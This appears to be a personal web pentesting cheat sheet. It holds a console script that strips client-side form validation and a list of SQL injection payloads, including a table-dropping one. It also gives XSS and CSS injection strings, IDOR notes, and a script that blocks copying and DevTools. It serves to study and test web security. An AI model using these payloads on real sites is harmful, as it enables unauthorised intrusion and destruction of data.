# Pentesting

## Attack

### Utils

#### 1 Disable validation

**for innerHTML***
```
// Lock body innerHTML
Object.defineProperty(document.body, 'innerHTML', {
  set: function() { /* block the replacement */ },
  get: function() {
    return document.documentElement.innerHTML;
  }
});
```

```js
// disable built-in validation
HTMLInputElement.prototype.checkValidity = () => true;
HTMLFormElement.prototype.checkValidity = () => true;
HTMLTextAreaElement.prototype.checkValidity = () => true;
HTMLSelectElement.prototype.checkValidity = () => true;

// remove attribute validation
document.querySelectorAll("*").forEach(element => {
    element.removeAttribute("required");
    element.removeAttribute("minlength");
    element.removeAttribute("maxlength");
    element.removeAttribute("pattern");
    element.removeAttribute("min");
    element.removeAttribute("max");
    element.removeAttribute("step");
    element.removeAttribute("disabled");
    element.removeAttribute("type");
});


// change input type = text;
document.querySelectorAll("input").forEach(input => {
    input.type = "text";
});


// override custom validation messages
document.querySelectorAll("input, textarea, select").forEach(element => {
    element.setCustomValidity("");
});

// remove event validation
document.querySelectorAll("input, textarea, select, form").forEach(element => {
    element.oninput = null;
    element.onchange = null;
    element.onblur = null;
    element.onsubmit = null;
});

// stop java script from blocking submission
document.querySelectorAll("form").forEach(form => {
    form.addEventListener("submit", function(event) {
        // prevent listener 
        event.stopPropagation();
    }, true);
});

// disable copy paste protection
document.oncopy = null;
document.onpaste = null;

// disable right click protection by removing custom context
document.oncontextmenu = null;

// disable validation for all the form
const forms = document.querySelectorAll("form");    
forms.forEach(form => {
    form.noValidate = true;
});

{
    window.outerWidth = window.innerWidth;
    for (let i = 0; i < 10000; i++) {
        clearInterval(i);
    }
}

console.log("Client-site validation disabled \^w^/");
```
### 2 Manual

#### SQL Injection 

```
' OR SLEEP(5) --
' OR SLEEP(3) --
' OR SLEEP(10) --
' OR SLEEP(100000000000) --
' OR 1=1 --
" OR "1"="1"
admin'--
admin' --
'; DROP TABLE users;--
'; DROP TABLE usuario;--
' UNION SELECT 1,2,3--
' UNION SELECT NULL, NULL --
' OR 'x'='x
admin'/*
' AND 1=1 --
' AND 1=2 --
1 OR 1=1--
1 OR 1=1
```

#### IDOR Insecure Direct Object Reference

```text
name: normal_user
user: 0@_normalUser_@0

/api/user?id=1 => 2
/api/data?id=2 => 3
```

#### XSS (Cross-Site Scripting)

##### htmlspecialchars
```
<script>alert(0);</script>
<img src=x onerror=alert(0)>
<svg onload=alert(0)>
<body onload=alert(0)>
<input autofocus onfocus=alert(0)>
<a href="javascript:alert(0)">click</a>

// WEAK - default, only escapes < > &
htmlspecialchars($input)

" onmouseover="alert(1)
' onmouseover='alert(0)

// WEAK - no charset specified
htmlspecialchars($input, ENT_QUOTES)

+ADw-script+AD4-alert(1)+ADw-/script+AD4-

// CORRECT - escapes ' " < > &
htmlspecialchars($input, ENT_QUOTES, 'UTF-8')
```

##### Link
```

<a href="<?= htmlspecialchars($url, ENT_QUOTES, 'UTF-8') ?>">click</a>

<a href="javascript:alert(1)">click</a>

javascript:alert(1)

$url = $_GET['url'];
if (!preg_match('/^https?:\/\//', $url)) {
    $url = '#';
}
<a href="<?= htmlspecialchars($url, ENT_QUOTES, 'UTF-8') ?>">click</a>
```

#### CSS Injection

```
<style>body{background:red!important}</style>
```

#### Overflow DB
````
spam => A
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
````
#### brute force

```
brute force ??????????????/
```

## Defense (===)

### 1 Cheat

```js
(() => {

    /* Block right click */
    document.addEventListener("contextmenu", event => {
        event.preventDefault();
    });

    /* Block copy */
    document.addEventListener("copy", event => {
        event.preventDefault();
    });

    /* Block paste */
    document.addEventListener("paste", event => {
        event.preventDefault();
    });

    /* Block keys */
    document.addEventListener("keydown", event => {

        const key = (event.key || "").toLowerCase();

        // Ctrl + C
        if (event.ctrlKey && key === "c") {
            event.preventDefault();
        }

        // Ctrl + V
        if (event.ctrlKey && key === "v") {
            event.preventDefault();
        }

        // Ctrl + Shift + I
        if (event.ctrlKey && event.shiftKey && key === "i") {
            event.preventDefault();
        }

        // F12
        if (key === "f12") {
            event.preventDefault();
        }

        // Context Menu key
        if (key === "contextmenu") {
            event.preventDefault();
        }

        // Shift + F10
        if (event.shiftKey && key === "f10") {
            event.preventDefault();
        }

    });

    /* Silent DevTools detection */
    let devtoolsOpened = false;

    setInterval(() => {

        const widthDiff = window.outerWidth - window.innerWidth;
        const heightDiff = window.outerHeight - window.innerHeight;

        if ((widthDiff > 160 || heightDiff > 160) && !devtoolsOpened) {

            devtoolsOpened = true;

            console.clear();

            document.body.innerHTML = `
                <div style="
                    display:flex;
                    justify-content:center;
                    align-items:center;
                    height:100vh;
                    font-family:sans-serif;
                    font-size:20px;
                ">
                    Developer tools detected
                </div>
            `;

        }

    }, 1000);

})();
```

